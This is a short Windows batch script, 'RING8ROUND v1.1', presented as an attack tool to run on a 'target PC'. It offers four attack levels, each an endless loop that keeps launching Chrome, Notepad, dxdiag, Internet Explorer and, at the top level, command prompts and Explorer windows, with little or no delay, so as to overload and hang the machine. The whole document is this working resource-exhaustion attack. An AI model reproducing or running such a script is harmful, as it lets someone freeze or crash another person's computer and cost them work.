@echo off
title ring8round 1.1
echo ===========================================================
echo                      RING8ROUND v.1.1
ECHO ===========================================================
echo Please read the README! for info on how to use this program.
color 4
echo WARNING! PLEASE MAKE SURE THE PC YOU USE THIS ON IS THE TARGET PC!
color 0
echo Four types of attacks: Light, Medium, Heavy, Ultra
set /p "attack=Enter The attack type in lowercase: "
if %attack% == "light" goto Light
if %attack% == "medium" goto Medium 
if %attack% == "heavy" goto heavy
if %attack% == "Ultra" goto Ultra

:Light
start chrome.exe
timeout /t 10 /nobreak
start notepad.exe 
timeout /t 10 /nobreak
start dxdiag.exe
timeout /t 10 /nobreak 
start iexplore.exe
goto Light

:Medium
start chrome.exe
timeout /t 5 /nobreak 
start notepad.exe
timeout /t 5 /nobreak
start dxdiag.exe
timeout /t 5 /nobreak
start iexplore.exe
goto Medium

:heavy
start chrome.exe
timeout /t 3 /nobreak
start notepad.exe
timeout /t 3 /nobreak
start notepad.exe
timeout /t 1 /nobreak
start dxdiag.exe
timeout /t 1 /nobreak
start iexplore.exe
goto heavy

:Ultra
start chrome.exe
start notepad.exe
start dxdiag.exe
start iexplore.exe
start cmd.exe
start cmd.exe
start explorer.exe
goto Ultra
